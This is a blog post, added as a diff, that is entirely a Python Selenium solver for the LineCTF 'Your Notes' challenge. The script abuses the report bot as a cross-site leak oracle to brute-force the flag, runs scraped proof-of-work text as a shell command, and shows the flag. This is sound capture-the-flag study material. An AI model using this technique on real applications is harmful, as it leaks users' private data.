@@ -1,0 +1,349 @@
+<!DOCTYPE html><html lang="en"><head>
+    
+      <title>
+        LineCTF Your Notes solver ::
+        jorgectf — blog
+      </title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<meta name="description" content="LineCTF Your Notes solver."/>
+<meta name="keywords" content=""/>
+<meta name="robots" content="noodp"/>
+<link rel="canonical" href="https://jorgectf.gitlab.io/blog/post/linectf-2021-your-notes/"/>
+
+
+
+
+
+<link rel="stylesheet" href="https://jorgectf.gitlab.io/blog/assets/style.css"/>
+
+<link rel="stylesheet" href="https://jorgectf.gitlab.io/blog/style.css"/>
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://jorgectf.gitlab.io/blog/img/apple-touch-icon-144-precomposed.png"/>
+<link rel="shortcut icon" href="https://jorgectf.gitlab.io/blog/img/favicon.png"/>
+
+
+<link href="https://jorgectf.gitlab.io/blog/assets/fonts/Inter-Italic.woff2" rel="preload" type="font/woff2" as="font" crossorigin=""/>
+<link href="https://jorgectf.gitlab.io/blog/assets/fonts/Inter-Regular.woff2" rel="preload" type="font/woff2" as="font" crossorigin=""/>
+<link href="https://jorgectf.gitlab.io/blog/assets/fonts/Inter-Medium.woff2" rel="preload" type="font/woff2" as="font" crossorigin=""/>
+<link href="https://jorgectf.gitlab.io/blog/assets/fonts/Inter-MediumItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin=""/>
+<link href="https://jorgectf.gitlab.io/blog/assets/fonts/Inter-Bold.woff2" rel="preload" type="font/woff2" as="font" crossorigin=""/>
+<link href="https://jorgectf.gitlab.io/blog/assets/fonts/Inter-BoldItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin=""/>
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="LineCTF Your Notes solver"/>
+<meta name="twitter:description" content="LineCTF Your Notes solver."/>
+
+
+
+<meta property="og:title" content="LineCTF Your Notes solver"/>
+<meta property="og:description" content="LineCTF Your Notes solver."/>
+<meta property="og:type" content="article"/>
+<meta property="og:url" content="https://jorgectf.gitlab.io/blog/post/linectf-2021-your-notes/"/><meta property="article:section" content="post"/>
+<meta property="article:published_time" content="2020-03-20T00:00:00+00:00"/>
+<meta property="article:modified_time" content="2020-03-20T00:00:00+00:00"/><meta property="og:site_name" content="jorgectf"/>
+
+
+
+
+
+
+
+  </head>
+  <body class="dark-theme">
+    <div class="container">
+      <header class="header">
+  <span class="header__inner">
+    <a href="https://jorgectf.gitlab.io/blog/" class="logo" style="text-decoration: none;">
+  
+  <img src="https://jorgectf.gitlab.io/blog/logo.png" alt="jorgectf"/>
+  
+</a>
+    <span class="header__right">
+      
+        <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+    
+    
+    <li><a href="https://jorgectf.gitbook.io/awae-oswe-preparation-resources/">OSWE Cheatsheet</a></li>
+    
+    
+    
+    <li><a href="https://jorgectf.gitlab.io/blog/research/">Research</a></li>
+    
+    
+    <li><a href="../">About</a></li>
+    
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+    
+    <li><a href="https://jorgectf.gitbook.io/awae-oswe-preparation-resources/">OSWE Cheatsheet</a></li>
+    
+    
+    
+    <li><a href="https://jorgectf.gitlab.io/blog/research/">Research</a></li>
+    
+    
+    <li><a href="../">About</a></li>
+  </ul>
+</nav>
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none"></path>
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"></path>
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"></path>
+</svg>
+
+      </span>
+    </span>
+  </span>
+</header>
+
+
+      <div class="content">
+        
+  
+  
+
+  <div class="post">
+    <h1 class="post-title">LineCTF Your Notes solver</h1>
+    <div class="post-meta">
+      
+        <span class="post-date">
+          2020-03-20
+        </span>
+
+        
+          
+        
+      
+
+      
+
+
+      
+    </div>
+
+    
+      <span class="post-tags">
+        
+          <a href="https://jorgectf.gitlab.io/blog/tags/ctf/">#CTF</a> 
+        
+          <a href="https://jorgectf.gitlab.io/blog/tags/linectf/">#LineCTF</a> 
+        
+          <a href="https://jorgectf.gitlab.io/blog/tags/web/">#Web</a> 
+        
+          <a href="https://jorgectf.gitlab.io/blog/tags/xsleak/">#XSLeak</a> 
+        
+      </span>
+    
+
+    
+
+    <div class="post-content">
+      
+      <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#f92672">from</span> selenium <span style="color:#f92672">import</span> webdriver
+<span style="color:#f92672">from</span> selenium.webdriver.common.keys <span style="color:#f92672">import</span> Keys
+<span style="color:#f92672">from</span> selenium.webdriver.common.by <span style="color:#f92672">import</span> By
+<span style="color:#f92672">from</span> selenium.webdriver.support.ui <span style="color:#f92672">import</span> WebDriverWait
+<span style="color:#f92672">from</span> selenium.webdriver.support <span style="color:#f92672">import</span> expected_conditions <span style="color:#66d9ef">as</span> ec
+<span style="color:#f92672">from</span> selenium.webdriver.common.desired_capabilities <span style="color:#f92672">import</span> DesiredCapabilities
+<span style="color:#f92672">import</span> random<span style="color:#f92672">,</span> string<span style="color:#f92672">,</span> subprocess
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">random_string</span>(length):
+    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(random<span style="color:#f92672">.</span>choices(string<span style="color:#f92672">.</span>ascii_lowercase <span style="color:#f92672">+</span> string<span style="color:#f92672">.</span>digits, k<span style="color:#f92672">=</span>length))
+
+options <span style="color:#f92672">=</span> webdriver<span style="color:#f92672">.</span>FirefoxOptions()
+options<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;--headless&#39;</span>)
+options<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;--no-sandbox&#39;</span>)
+<span style="color:#75715e"># driver = webdriver.Remote(&#34;HUB_URL&#34;, options=options)</span>
+driver <span style="color:#f92672">=</span> webdriver<span style="color:#f92672">.</span>Firefox(options<span style="color:#f92672">=</span>options)
+
+chall_url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://34.84.94.138&#34;</span>  <span style="color:#75715e"># Change this</span>
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">create_account</span>():
+  username, password <span style="color:#f92672">=</span> random_string(<span style="color:#ae81ff">10</span>), random_string(<span style="color:#ae81ff">10</span>)
+  print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Creating </span><span style="color:#e6db74">{</span>username<span style="color:#e6db74">}</span><span style="color:#e6db74">:</span><span style="color:#e6db74">{</span>password<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+  driver<span style="color:#f92672">.</span>get(chall_url <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/register&#34;</span>)
+  <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">2</span>):
+    WebDriverWait(driver, <span style="color:#ae81ff">10</span>)<span style="color:#f92672">.</span>until(ec<span style="color:#f92672">.</span>element_to_be_clickable((By<span style="color:#f92672">.</span>NAME, <span style="color:#e6db74">&#34;username&#34;</span>)))
+    driver<span style="color:#f92672">.</span>find_element_by_name(<span style="color:#e6db74">&#34;username&#34;</span>)<span style="color:#f92672">.</span>send_keys(username)
+    driver<span style="color:#f92672">.</span>find_element_by_name(<span style="color:#e6db74">&#34;password&#34;</span>)<span style="color:#f92672">.</span>send_keys(password)
+    driver<span style="color:#f92672">.</span>find_element_by_xpath(<span style="color:#e6db74">&#34;//button[@type=&#39;submit&#39;]&#34;</span>)<span style="color:#f92672">.</span>click()
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">new_note</span>(title, content):
+  driver<span style="color:#f92672">.</span>find_element_by_xpath(<span style="color:#e6db74">&#34;//a[contains(@href,&#39;note&#39;)]&#34;</span>)<span style="color:#f92672">.</span>click()
+  driver<span style="color:#f92672">.</span>find_element_by_name(<span style="color:#e6db74">&#34;title&#34;</span>)<span style="color:#f92672">.</span>send_keys(title)
+  driver<span style="color:#f92672">.</span>find_element_by_name(<span style="color:#e6db74">&#34;content&#34;</span>)<span style="color:#f92672">.</span>send_keys(content)
+  driver<span style="color:#f92672">.</span>find_element_by_xpath(<span style="color:#e6db74">&#34;//button[@type=&#39;submit&#39;]&#34;</span>)<span style="color:#f92672">.</span>click()
+  WebDriverWait(driver, <span style="color:#ae81ff">10</span>)<span style="color:#f92672">.</span>until(ec<span style="color:#f92672">.</span>element_to_be_clickable((By<span style="color:#f92672">.</span>XPATH, <span style="color:#e6db74">&#34;//h3[contains(@class,&#39;title&#39;)]&#34;</span>)))
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">report</span>(url):
+  <span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
+    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Reporting </span><span style="color:#e6db74">{</span>url<span style="color:#e6db74">}</span><span style="color:#e6db74">...&#34;</span>)
+    driver<span style="color:#f92672">.</span>get(chall_url <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/report&#34;</span>)
+    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;login&#34;</span> <span style="color:#f92672">in</span> driver<span style="color:#f92672">.</span>current_url:
+      print(<span style="color:#e6db74">&#34;Relogging&#34;</span>)
+      create_account()
+      <span style="color:#66d9ef">continue</span>
+    <span style="color:#66d9ef">try</span>:
+      WebDriverWait(driver, <span style="color:#ae81ff">60</span>)<span style="color:#f92672">.</span>until(ec<span style="color:#f92672">.</span>element_to_be_clickable((By<span style="color:#f92672">.</span>NAME, <span style="color:#e6db74">&#34;url&#34;</span>)))
+    <span style="color:#66d9ef">except</span>:
+      <span style="color:#66d9ef">continue</span>
+    driver<span style="color:#f92672">.</span>find_element_by_name(<span style="color:#e6db74">&#34;url&#34;</span>)<span style="color:#f92672">.</span>send_keys(url)
+    proof <span style="color:#f92672">=</span> driver<span style="color:#f92672">.</span>find_element_by_xpath(<span style="color:#e6db74">&#34;/html/body/div/div/div/div[1]/form/div[4]/p[2]/strong&#34;</span>)<span style="color:#f92672">.</span>text<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34; &#34;</span>)
+    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Calculating nonce... </span><span style="color:#e6db74">{</span>proof<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+    proof <span style="color:#f92672">=</span> subprocess<span style="color:#f92672">.</span>check_output(proof)<span style="color:#f92672">.</span>decode()
+    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Proof is </span><span style="color:#e6db74">{</span>proof<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+    driver<span style="color:#f92672">.</span>find_element_by_name(<span style="color:#e6db74">&#34;proof&#34;</span>)<span style="color:#f92672">.</span>send_keys(proof)
+    driver<span style="color:#f92672">.</span>find_element_by_xpath(<span style="color:#e6db74">&#34;/html/body/div/div/div/div[1]/form/div[3]/p/button&#34;</span>)<span style="color:#f92672">.</span>click()
+    <span style="color:#66d9ef">try</span>:
+      WebDriverWait(driver, <span style="color:#ae81ff">60</span>)<span style="color:#f92672">.</span>until(ec<span style="color:#f92672">.</span>element_to_be_clickable((By<span style="color:#f92672">.</span>XPATH, <span style="color:#e6db74">&#34;/html/body/div/div/div/div[1]/form/div[5]&#34;</span>)))
+    <span style="color:#66d9ef">except</span>:
+      <span style="color:#66d9ef">continue</span>
+    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;Thank&#34;</span> <span style="color:#f92672">in</span> driver<span style="color:#f92672">.</span>find_element_by_xpath(<span style="color:#e6db74">&#34;/html/body/div/div/div/div[1]/form/div[5]&#34;</span>)<span style="color:#f92672">.</span>text:
+      <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
+    <span style="color:#66d9ef">else</span>:
+      <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>
+
+
+create_account()
+
+known <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;LINECTF{1-kn0w-what-y0u-d0wn10ad}&#34;</span>
+charset <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;}&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;-&#34;</span> <span style="color:#f92672">+</span> string<span style="color:#f92672">.</span>ascii_lowercase <span style="color:#f92672">+</span> string<span style="color:#f92672">.</span>digits
+index <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+
+<span style="color:#66d9ef">while</span> known[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;}&#34;</span>:
+  url <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>chall_url<span style="color:#e6db74">}</span><span style="color:#e6db74">/search?q=</span><span style="color:#e6db74">{</span>known<span style="color:#e6db74">}{</span>charset[index]<span style="color:#e6db74">}</span><span style="color:#e6db74">&amp;download=&#34;</span>
+  print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Trying </span><span style="color:#e6db74">{</span>known<span style="color:#e6db74">}{</span>charset[index]<span style="color:#e6db74">}</span><span style="color:#e6db74"> - </span><span style="color:#e6db74">{</span>index<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+
+  <span style="color:#66d9ef">if</span> report(url):
+    known <span style="color:#f92672">+=</span> charset[index]
+    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Found </span><span style="color:#e6db74">{</span>known<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+
+  <span style="color:#66d9ef">if</span> index <span style="color:#f92672">==</span> len(charset)<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>:
+    index <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+  <span style="color:#66d9ef">else</span>:
+    index <span style="color:#f92672">+=</span><span style="color:#ae81ff">1</span>
+
+driver<span style="color:#f92672">.</span>close()
+driver<span style="color:#f92672">.</span>quit()
+</code></pre></div>
+    </div>
+    
+      
+        <div class="pagination">
+          <div class="pagination__title">
+            <span class="pagination__title-h">Read other posts</span>
+            <hr/>
+          </div>
+          <div class="pagination__buttons">
+            
+              <span class="button previous">
+                <a href="https://jorgectf.gitlab.io/blog/post/cybex-writeup/">
+                  <span class="button__icon">←</span>
+                  <span class="button__text">CybexCTF 2020 Writeup (Beep Boop, Potencial/Intensidad &amp; Unsafe Behaviour)</span>
+                </a>
+              </span>
+            
+            
+              <span class="button next">
+                <a href="https://jorgectf.gitlab.io/blog/post/nahamconctf-2021-agenttester/">
+                  <span class="button__text">NahamCon 2021 CTF&#39;s AgentTester solver</span>
+                  <span class="button__icon">→</span>
+                </a>
+              </span>
+            
+          </div>
+        </div>
+      
+    
+
+    
+      
+        
+
+<script src="https://unpkg.com/shiki"></script>
+
+<script>
+    if (document.querySelector("code[data-lang*='ql']")) {
+        shiki
+            .getHighlighter({
+                theme: 'github-dark',
+                langs: [
+                    {
+                        id: 'codeql',
+                        scopeName: 'source.ql',
+                        path: '/languages/codeql.tmLanguage.json',
+                        samplePath: 'codeql.sample',
+                        aliases: ['ql']
+                    }
+                ]
+            })
+            .then(highlighter => {
+                for (codeElement of document.querySelectorAll("code[data-lang]")) {
+                    try {
+                        let prev = codeElement.textContent
+                        let code = highlighter.codeToHtml(prev, { lang: codeElement.dataset.lang.toString() })
+                        codeElement.parentNode.innerHTML = code
+                    } catch(err) {
+                        console.log(err)
+                    }
+                }
+                for (shikiElement of document.querySelectorAll("pre[class='shiki']")) {
+                    shikiElement.parentNode.parentNode.replaceChild(
+                        shikiElement, shikiElement.parentNode
+                    )
+                }
+            })
+    }
+</script>
+      
+    
+  </div>
+
+      </div>
+
+      
+        <footer class="footer">
+  <div class="footer__inner">
+    
+      <a href="https://jorgectf.gitlab.io/blog/" class="logo" style="text-decoration: none;">
+  
+  <img src="https://jorgectf.gitlab.io/blog/logo.png" alt="jorgectf"/>
+  
+</a>
+      <div class="copyright">
+        <span>© 2021 Powered by
+          <a href="https://gohugo.io" target="_blank" rel="noopener">Hugo</a></span>
+        <span>Theme created by
+          <a href="https://twitter.com/panr" target="_blank" rel="noopener">panr</a></span>
+      </div>
+    
+  </div>
+</footer>
+
+<script src="https://jorgectf.gitlab.io/blog/assets/main.js"></script>
+
+
+      
+    </div>
+
+    
+  
+
+</body></html>
